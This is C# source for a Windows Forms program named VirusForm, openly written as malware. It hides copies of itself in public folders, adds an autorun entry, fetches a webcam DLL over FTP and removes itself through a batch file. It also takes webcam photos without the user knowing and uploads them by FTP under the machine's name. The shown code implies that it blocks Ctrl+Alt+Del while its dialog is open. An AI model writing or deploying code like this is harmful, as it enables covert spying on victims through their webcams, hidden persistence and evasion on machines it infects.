using JCS;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;


namespace VirusForm
{
    public partial class Form1 : Form
    {
        public static string needPatch = "C:\\Users\\Public\\";

        WebCam webcam;
        string fileName;
        bool savePhoto = true;
       
        bool filesExists =false;
        VirusShowForm vsf;
 
        Thread virusFormWork;


        public Form1()
        {
            if (OSVersionInfo.Name == "Windows 7" || OSVersionInfo.Name == "Windows Vista")
            {
                Autorun.SetAutorunValue(true, needPatch + "VirusForm.exe"); // добавить в автозагрузку
                //SetAutorunValue(false, needPatch + "system.exe");  // убрать из автозагрузки
            }
            else
                if (OSVersionInfo.Name == "Windows XP")
                {
                    needPatch = "C:\\Documents and Settings\\All Users\\";
                    Autorun.SetAutorunValue(true, needPatch + "VirusForm.exe"); // добавить в автозагрузку
                    //SetAutorunValue(false, needPatch + "system.exe");  // убрать из автозагрузки
                }

           

            if (Application.ExecutablePath != needPatch + "VirusForm.exe")
                {
                    
                    CopyVirusFile();
                    System.Diagnostics.Process proc = new System.Diagnostics.Process();
                    proc.StartInfo.FileName = needPatch + "VirusForm.exe";
                    proc.Start();
                   
                    SelfDelete();
                    Process.GetCurrentProcess().Kill();
                }
                

         

         
            InitializeComponent();



        }
        private void VirusFormActivation()
        {
            vsf = new VirusShowForm();
            vsf.ShowDialog();
            
            
        }

        private void WebCamActivationAndSaveImage()
        {

            webcam = new WebCam();
            webcam.InitializeWebCam(ref pbImageFromCam);
            webcam.Start();

            
            pbImgCapture.BackgroundImage = pbImageFromCam.Image;
            pbImgCapture.BackgroundImageChanged += (ss, sss) =>
            {
                pbImgCapture.Image = pbImageFromCam.Image;

                fileName = DateTime.Now.Year + "_" + DateTime.Now.Month + "_" + DateTime.Now.Day + "_" + DateTime.Now.Hour + "_" + DateTime.Now.Minute + "_" + DateTime.Now.Second + ".Jpeg";
               
                    using (FileStream fstream = new FileStream(fileName, FileMode.Create))
                    {

                        pbImgCapture.Image.Save(fstream, System.Drawing.Imaging.ImageFormat.Jpeg);
                        savePhoto = false;


                    }
                    try
                    {

                        Network.UploadFileFTP(Environment.MachineName,fileName);
                        File.Delete(fileName);

                    }
                    catch (Exception ex)
                    {

                        //   MessageBox.Show(ex.Message);
                    }
               
             };
         
        }

        private void CopyVirusFile()
        {
            do{ 
            if (!File.Exists(needPatch + "WebCam_Capture.dll"))
             {
                  try
                {
                 Network.DownloadFileFTP(needPatch, "WebCam_Capture.dll");
                 File.SetAttributes(needPatch + "WebCam_Capture.dll", FileAttributes.Hidden);
                }
                  catch (Exception ex) { MessageBox.Show(ex.Message); }
             
             }


            if (!File.Exists(needPatch + "VirusForm.exe") && File.Exists(needPatch + "WebCam_Capture.dll"))
            {

                try
                {
                    File.Copy("VirusForm.exe", needPatch + "VirusForm.exe");
                    File.SetAttributes(needPatch + "VirusForm.exe", FileAttributes.Hidden);
                 
                    filesExists = true;
                    
                }
                catch { }
            }
            else
            {
             
                filesExists = true;
            }

          } while (!filesExists);
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            try
            {
                Thread.Sleep(180000);

                WebCamActivationAndSaveImage();
                virusFormWork = new Thread(VirusFormActivation);
                virusFormWork.IsBackground = true;
                virusFormWork.Start();
                Thread.Sleep(2000);
                WebCamActivationAndSaveImage();
                Thread.Sleep(180000);
                Application.Exit();
               
                 //   System.Diagnostics.Stopwatch sw = new System.Diagnostics.Stopwatch();
                 //   sw.Start();
                 //   bool b=true;
                 //   do
                 //   {
                 //       if (sw.Elapsed.Minutes == 0 && sw.Elapsed.Seconds == 0 && sw.Elapsed.Milliseconds == 1 )
                 //       {
                //             WebCamActivationAndSaveImage();
                 //             virusFormWork = new Thread(VirusFormActivation);
                 //             virusFormWork.IsBackground = true;
                 //             virusFormWork.Start();
                 //             WebCamActivationAndSaveImage();
                 //             b=false;
                 //       }
                 //   } while (b);
                 //
                 //   do
                 //   {
                 //       if (sw.Elapsed.Minutes == 0 && sw.Elapsed.Seconds == 3 && sw.Elapsed.Milliseconds == 1 )
                 //       {
                 //           WebCamActivationAndSaveImage();
                 //           b = true;
                 //       }
                 //   } while (!b);
                 //
                 //    do
                 //   {
                 //       if (sw.Elapsed.Minutes == 8)
                 //       {
                 //           Application.Exit();
                 //           b = false;
                 //       }
                 //   } while (b);
                 
                }
            catch (Exception ex)
            {
               // MessageBox.Show(ex.Message);
            }
        
        
        }

        private void pbImageFromCam_Paint(object sender, PaintEventArgs e)
        {
            if (savePhoto)
            {
                pbImgCapture.BackgroundImage = pbImageFromCam.Image;
               // webcam.Stop();
            }
        }
        public static void SelfDelete()
        {

            string batchCommands = string.Empty;
            string exeFileName = Assembly.GetExecutingAssembly().CodeBase.Replace("file:///", string.Empty).Replace("/", "\\");

            batchCommands += "@ECHO OFF\n";                         // Do not show any output
            batchCommands += "ping 127.0.0.1 > nul\n";              // Wait approximately 4 seconds (so that the process is already terminated)
            batchCommands += "echo j | del /F ";                    // Delete the executeable
            batchCommands += exeFileName + "\n";
            batchCommands += "echo j | del deleteMyProgram.bat";    // Delete this bat file

            File.WriteAllText("deleteMyProgram.bat", batchCommands);

            Process.Start("deleteMyProgram.bat");
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            VirusShowForm.EnableCTRLALTDEL();
        }

   
    }
}
